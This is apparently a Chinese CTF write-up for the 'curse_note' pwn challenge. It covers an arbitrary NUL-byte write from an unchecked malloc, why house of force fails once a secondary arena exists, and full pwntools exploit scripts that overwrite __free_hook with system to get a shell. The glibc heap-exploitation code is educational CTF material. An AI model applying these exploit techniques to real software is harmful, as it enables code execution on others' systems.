---
title: curse_note
date: 2019-08-11 18:30:39
tags: heap
---
比赛时候遇到的比较难受的一题
<!--more-->
# prelog
主要的漏洞是可以任意地址写一个字节的`\x00`
比赛的时候以为和`2018铁三:myhouse`或者和`pwnable:wannaheap`挺像的
后来一直调不出来:主要遇到的问题是在了`house of force`之后已经将topchunk指针移到`__malloc_hook`上方后发现`malloc`得到的值都是在`mmap`的一个
区域.
比赛的时候时间比较紧张,太急了没调出来.今天复现一下.
# analysis
[binary][2]
全保护
```python
n132>>> checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
洞我目前只看到了一个`add-note`中的`malloc`返回值无检测导是否申请失败致的任意地址写一字节的`\x00`
```c
      ptr[v1] = (char *)malloc(size);
      sub_555555554A90("info: ");
      read(0, ptr[v1], size);
      ptr[v1][size - 1] = 0;//*(0+size)<-0
      dword_555555756068[v1] = size;
```
# 复现 
首先是复现一下昨天螺旋出错的位置.
我当时的思路:
1. 利用任意地址写0控制 `main_arena`的`topchunk`最低字节
2. 使其指向我们控制的区域造成`house of force`
3. malloc 一个较大值 使得`topchunk`指向`__malloc_hook`上方
4. malloc 获得`__malloc_hook`
出错的脚本
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(idx,size,c):
	cmd(1)
	cmd(idx)
	cmd(size)
	p.sendafter(": ",c)
def show(idx):
	cmd(2)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
context.log_level='debug'
p=process('./pwn')
libc=ELF("./pwn").libc
add(0,0xe8,"A")
add(1,0x68,"B")
add(2,0x68,"B")
free(0)
add(0,0xe8,"A")
show(0)
base=u64(p.read(8))-(0x7ffff7dd1b41-0x7ffff7a0d000)
free(0)
free(1)
free(2)
add(1,0x68,"A")
show(1)
heap=u64(p.read(8))-(0x41)

log.warning(hex(base))
log.warning(hex(heap))
add(0,0x68,p64(0xffffffffffffffff)*2)

free(1)

AIM=0x7ffff7dd1b70-0x7ffff7a0d000+base+0x9
add(2,AIM,"A")
p.readuntil(":")
AIM=0x7ffff7dd1b10-0x555555757100-0x30
add(1,AIM,"YY")
gdb.attach(p,'b *0x000555555554D45')
#free(0)
#add(0,0x01,"YY")
p.interactive()
```
此时heap内存的状况:
```s
n132>>> p &__malloc_hook
$2 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>
n132>>> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x7ffff7dd1af0 (size : 0xffffd5555d985608) (top is broken ?) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0f0)  smallbin[13]: 0x555555757000
```
可以看出`topchunk`指针已经指到了`__malloc_hook`上方 但是昨天我百思不得解的是之后我`malloc`的chunk都是在下面这个区域取得的.
```python
0x00007ffff0000000 0x00007ffff0021000 rw-p	mapped
```
调试发现这个区域是之前在[Null][1]中学习的非主分配区..

## House of Force : Fail
之前对malloc源码的阅读主要集中在`_int_malloc`里忽略了申请失败的时候的后续步骤:
```c
//https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_malloc
 victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }
```
这里可以看到用了`arena_get_retry`
```c
static mstate
arena_get_retry (mstate ar_ptr, size_t bytes)
{
  LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr);
  if (ar_ptr != &main_arena)
    {
      __libc_lock_unlock (ar_ptr->mutex);
      ar_ptr = &main_arena;
      __libc_lock_lock (ar_ptr->mutex);
    }
  else
    {
      __libc_lock_unlock (ar_ptr->mutex);
      ar_ptr = arena_get2 (bytes, ar_ptr);
    }
  return ar_ptr;
}
```
用了`arena_get2`获得了一个子分配区
...于是之后如果再次`_int_malloc`时
参数情况如下
```python
 ► 0x7ffff7a9117f <malloc+79>     call   _int_malloc <0x7ffff7a8eb80>
        rdi: 0x7ffff0000020 ◂— 0x300000001
        rsi: 0x2aaaa267a9e0
```
这里的av指向的非主分配区...

所以出现了我就算把topchunk的指针指向了`__malloc_hook`上方但是还是无法继续`malloc`一个较小的值来获得`__malloc_hook`

那么问题来了既然第一次任意地址写0的时候已经产生了子分配区那么为啥我在控制了`topchunk_size`之后`malloc`了一个大值使得`topchunk`下移到`__malloc_hook`
时候成功将主分配区的topchunk控制.初步估计是大小的问题于是乎看看源码找找问题...经过一番调试发现了一些平时没有子分配区时候遇到不到的事情...
在控制了`topchunk_size`之后用于做第三步(*malloc 一个较大值 使得`topchunk`指向`__malloc_hook`上方*)时候malloc的流程:
1. 第一次调用_int_malloc 此时 参数 av 指向 子分配区
2. 因为不够大 结果失败
3. 第二次调用_int_malloc 此时 参数 av 指向 主分配区
4. 因为主分配区的topchunk够大（被我们改了）所以分配成功

第二次没有取是因为.chunk_size不够大在第一次`_int_malloc`.
那么如果我们设置一个比较大的size是否可以成功获取`__malloc_hook`
结论是否定的因为本题有以下约束
1. topchunk->0x7ffff7dd1af0
2. 因为在malloc时会向新的topchunk写入size所以malloc 的大小应当小于 stack_end-topchunk （此时依然在第一次_int_malloc时就成功获取故不可用）或者>bss+0x10000000000000000-topchunk(0xffffd5555d985510 为负数 没办法过 `test+js`)
3. 至此...house of force应该是流产了...
那咱此路不通换条路.

# 行得通的大概率非预期解
经过长时间的尝试...（其实大部分时间都在摸鱼）.试过了`orange`,修改`global_fast_max`..都失败了
我突然想到可以直接 把主分配区`topchunk`的head放到sub_heap的`topchunk`的head上
之后再次malloc把`topchunk`的指针指向`free_hook`通过控制一开始的`topchunk_size`达到任意地址写的效果不过因为`inuse`位的关系所以末尾为9或者1
但是还好system的地址末尾是0:
`0x7fbd995d7390 <__libc_system>:	test   rdi,rdi`
改成1之后影响不大:
`0x7fbd995d7391 <__libc_system+1>:	test   edi,edi`
于是我就做出来了but 估计是非预期...
现整理一下思路:
1. 通过任意地址写一bit的0改写main_arena.topchunk指针的最低bit使其指向已控制区域改写 topchunk的size(house of force)
2. malloc 较大的值使得main_arena.topchun的size域恰好落在sub_heap的topchunk的size上这样使得我们可以再次利用
3. malloc 一个较大的值使得sub_heap的topchunk的size恰好落在 free_hook上(事先经过计算使得其值等于system+1)
4. system('/bin/sh');

想到这个思路走了好多弯路...
exp:
1/16概率
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(idx,size,c):
	cmd(1)
	cmd(idx)
	cmd(size)
	p.sendafter(": ",c)
def show(idx):
	cmd(2)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
context.log_level='debug'
p=process('./patched')
libc=ELF("./patched").libc
add(0,0xe8,"A")
add(1,0x58,"B")
add(2,0x58,"B")
free(0)
add(0,0xe8,"A")
show(0)
base=u64(p.read(8))-(0x7ffff7dd1b41-0x7ffff7a0d000)
free(0)
free(1)
free(2)
add(1,0x58,"A")
show(1)
heap=u64(p.read(8))-(0x41)
log.warning(hex(base))
log.warning(hex(heap))
libc.address=base
one=0xf1147+base
ATM=libc.sym['system']+(libc.sym['__free_hook']-heap-0x100)+1-8
add(0,0x58,p64(ATM)*2)
AIM=0x7ffff7dd1b79-0x7ffff7a0d000+base
add(2,AIM,"B")
p.readuntil(":")
#p *(struct malloc_state *) 0x7ffff0000020
AIM=(base&0xffffffffff0000000)+0x1000000*4+0x8b0-heap-0x100-0x10
log.warning(hex(AIM))
add(2,AIM,"B")
free(0)
free(1)
AIM=(0x7ffff7dd37a8+base-0x7ffff7a0d000)-((base&0xffffffffff0000000)+0x1000000*4+0x8b0)-0x10
add(0,AIM,"/bin/sh;")
gdb.attach(p)
free(0)
p.interactive("n132>>")
```
# epilog
最近发现`OFF_BY_NULL_BYTE`知识点题目都出的差不多的现在流行任意地址一字节0了,同时感觉`sub_heap`会越来越多.毕竟现在主分配区heap都被玩的差不多了。
任意地址写0可能的攻击方法:
改写`main_arena topchunk`造成`house of force`
1. 如果没有subheap没有`malloc_size`的限制那么难度不大
2. 只有sub_heap感觉我上述的通过控制topchunk_size 来实现任意地址写的方法在有泄漏的时候还是比较好用的(没泄漏的话感觉直接GG...)
3. 只有`malloc_size`限制但是不是特别死(因为global_max_fast就在main_arena下方0x2000+左右)的时候感觉尝试控制`global_max_fast`之后控制stdxxx的虚表 感觉不失为一种好方法（未曾尝试过,如果有人想尝试失败了别来打我/狗头.jpg..）
猜测新的出题方向(瞎猜):
* 任意地址字节写0+size控制





[1]: https://n132.github.io/2019/05/28/2019-05-28-Null/#ARENA-c
[2]: https://github.com/n132/Watermalon/tree/master/Xman-2019/curse-note